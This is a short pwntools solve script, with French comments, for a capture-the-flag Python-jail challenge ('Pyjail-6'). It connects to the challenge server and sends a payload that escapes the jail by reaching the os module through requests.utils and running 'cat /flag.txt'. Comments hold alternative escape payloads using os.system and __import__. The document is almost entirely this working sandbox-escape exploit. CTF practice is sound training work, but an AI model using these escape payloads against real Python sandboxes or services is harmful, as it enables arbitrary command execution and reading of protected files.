# Pyjail-6 — Pwny-CTF (script de solve)
from pwn import *

HOST, PORT = "chal.sigpwny.com", 5017
context.log_level = "debug"

io = remote(HOST, PORT)

# exec -> import os ; os.system(\"cat /flag.txt\")
# eval -> __import__('os').system('cat /????.txt')

# List les import interne de requests
# python3 -c "import requests; print([a for a in dir(requests.utils) if not a.startswith('_')])"

payload = b"import requests; print(requests.utils.os.popen(\"cat /flag.txt\").read())"

io.sendlineafter(b"yourself?", payload)
io.recv()
io.interactive()